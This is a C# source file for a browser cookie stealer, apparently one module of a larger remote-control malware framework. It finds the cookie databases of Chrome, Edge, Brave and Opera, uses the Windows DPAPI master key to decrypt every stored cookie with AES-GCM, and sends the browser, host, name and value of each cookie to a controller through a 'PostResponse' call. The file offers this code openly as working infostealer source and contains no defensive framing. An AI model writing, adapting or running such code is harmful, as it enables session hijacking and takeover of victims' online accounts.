using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using True.Core;
using True.Helpers;

public class BrowserCookieExtractor
{
    private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    private static readonly string[] ChromiumPaths =
    {
        @"Google\Chrome\User Data\Default\Network\Cookies",
        @"Microsoft\Edge\User Data\Default\Network\Cookies",
        @"BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
        @"Opera Software\Opera Stable\Network\Cookies"
    };

    private static readonly string[] BrowserNames =
    {
        "Chrome",
        "Edge",
        "Brave",
        "Opera"
    };

    public static void Extract()
    {
        var report = new StringBuilder();

        for (int i = 0; i < ChromiumPaths.Length; i++)
        {
            string fullPath = Path.Combine(LocalAppData, ChromiumPaths[i]);
            string browser = BrowserNames[i];

            try
            {
                if (!File.Exists(fullPath))
                {
                    Logger.Warn($"[BrowserCookieExtractor] {browser} cookies file not found: {fullPath}");
                    continue;
                }

                string tempPath = Path.GetTempFileName();
                File.Copy(fullPath, tempPath, true);

                byte[] masterKey = DPAPIHelper.GetMasterKey(browser);
                if (masterKey == null)
                {
                    Logger.Warn($"[BrowserCookieExtractor] Failed to get master key for {browser}");
                    continue;
                }

                using (var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string host = reader.GetString(0);
                            string name = reader.GetString(1);
                            byte[] encryptedValue = (byte[])reader["encrypted_value"];
                            string value = DecryptCookieValue(encryptedValue, masterKey);

                            report.AppendLine($"{browser}|{host}|{name}|{value}");
                        }
                    }
                }

                File.Delete(tempPath);
            }
            catch (Exception ex)
            {
                Logger.Error($"[BrowserCookieExtractor] Failed on {browser}: {ex.Message}");
            }
        }

        if (report.Length == 0)
            report.Append("(no cookies extracted)");

        Communicator.PostResponse("browser_cookies", report.ToString());
    }

    private static string DecryptCookieValue(byte[] encryptedValue, byte[] masterKey)
    {
        try
        {
            const int NONCE_LENGTH = 12;
            const int TAG_LENGTH = 16;

            string prefix = Encoding.ASCII.GetString(encryptedValue, 0, 3);
            if (prefix == "v10" || prefix == "v11")
            {
                byte[] nonce = new byte[NONCE_LENGTH];
                Buffer.BlockCopy(encryptedValue, 3, nonce, 0, NONCE_LENGTH);

                int ciphertextLen = encryptedValue.Length - 3 - NONCE_LENGTH;
                byte[] ciphertext = new byte[ciphertextLen];
                Buffer.BlockCopy(encryptedValue, 3 + NONCE_LENGTH, ciphertext, 0, ciphertextLen);

                byte[] actualCiphertext = ciphertext[..^TAG_LENGTH];
                byte[] tag = ciphertext[^TAG_LENGTH..];

                byte[] plaintext = new byte[actualCiphertext.Length];
                using (var aesGcm = new AesGcm(masterKey))
                    aesGcm.Decrypt(nonce, actualCiphertext, tag, plaintext);

                return Encoding.UTF8.GetString(plaintext);
            }
            else
            {
                return DPAPIHelper.Decrypt(encryptedValue);
            }
        }
        catch
        {
            return "(decryption failed)";
        }
    }
}
